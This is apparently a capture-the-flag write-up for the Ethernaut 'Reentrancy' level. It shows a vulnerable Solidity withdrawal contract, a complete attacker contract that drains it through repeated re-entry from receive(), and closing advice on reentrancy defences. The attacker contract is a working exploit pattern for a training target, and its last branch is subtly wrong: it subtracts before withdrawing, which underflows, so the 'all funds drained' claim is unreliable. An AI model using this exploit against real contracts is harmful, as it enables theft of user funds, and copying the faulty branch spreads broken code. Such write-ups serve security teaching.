# Reentrancy

## Challenge Description

The goal of this level is for you to steal all the funds from the contract.

Things that might help:

-   Untrusted contracts can execute code where you least expect it.
-   Fallback methods
-   Throw/revert bubbling
-   Sometimes the best way to attack a contract is with another contract.
-   See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{ value: _amount }("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

## Challenge Solution Walkthrough

In this challenge, the goal is to drain all the funds from the given contract by repeatedly calling the `withdraw()` function and taking advantage of the reentrancy vulnerability.

To achieve this, we can deploy a separate contract, named `ReentranceSolution`, that will interact with the vulnerable contract and repeatedly call the `withdraw()` function. This contract will also handle the reentrancy attack by implementing a `receive()` function.

Here's an example implementation of the `ReentranceSolution` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./10Reentrancy.sol";

contract ReentranceSolution {
    Reentrance public reentrance;
    uint256 public valueToDonate;
    uint256 public totalValue;

    constructor(address reentranceAddress) public {
        reentrance = Reentrance(payable(reentranceAddress));
    }

    function solveChallenge() public payable {
        valueToDonate = msg.value;
        totalValue = address(reentrance).balance;
        reentrance.donate{ value: valueToDonate }(address(this));
        reentrance.withdraw(valueToDonate);
    }

    receive() external payable {
        if (totalValue == 0) {
            return;
        } else if (valueToDonate <= totalValue) {
            totalValue -= valueToDonate;
            reentrance.withdraw(valueToDonate);
        } else if (valueToDonate > totalValue) {
            totalValue -= valueToDonate;
            reentrance.withdraw(totalValue);
        }
    }
}
```

In the `solveChallenge()` function, we first donate a specific amount of money to the vulnerable contract by calling the `donate()` function. Then, we immediately call the `withdraw()` function to start the reentrancy attack.

The `receive()` function is marked as `external payable`, which means it can receive Ether. In this function, we handle the reentrancy attack by repeatedly calling the `withdraw()` function until all the funds are drained. If the total value of the funds in the vulnerable contract (`totalValue`) is greater than or equal to the amount we donated (`valueToDonate`), we call `withdraw(valueToDonate)`. Otherwise, we call `withdraw(totalValue)` to drain the remaining funds.

By executing the `solveChallenge()` function of the `ReentranceSolution` contract, we initiate the reentrancy attack and drain all the funds from the vulnerable contract.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and _re-enter_ your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

#### The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
